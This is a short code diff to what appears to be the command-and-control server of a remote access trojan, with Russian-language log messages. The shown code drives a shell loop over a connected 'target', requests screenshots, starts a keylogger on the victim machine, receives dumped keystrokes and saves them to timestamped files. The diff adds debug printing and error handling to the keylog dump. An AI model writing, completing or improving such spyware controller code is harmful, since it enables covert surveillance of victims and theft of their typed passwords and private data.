@@ -83,6 +83,7 @@ def save_screenshot(target, screenshot_id):
 
 def save_keylogs(logs):
     if logs.strip() and not logs.startswith("[!!]"):
+        print(f"[DEBUG] Сохраняемые логи: {logs}")
         timestamp = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
         file_name = f"keylog_{timestamp}.txt"
         try:
@@ -121,10 +122,14 @@ def shell(target, ip):
                 save_screenshot(target, screenshot_id)
                 screenshot_id += 1
             elif command == "keylog_start":
-                logging.info("[+] Кейлоггер запущен на клиенте.")
+                print(reliable_recv(target))
             elif command == "keylog_dump":
-                logs = reliable_recv(target)
-                save_keylogs(logs)
+                try:
+                    logs = reliable_recv(target)
+                    print(f"[DEBUG] Полученные логи: {logs}")
+                    save_keylogs(logs)
+                except Exception as e:
+                    logging.error(f"[!!] Ошибка при обработке команды keylog_dump: {e}")
             else:
                 response = reliable_recv(target)
                 print(response)
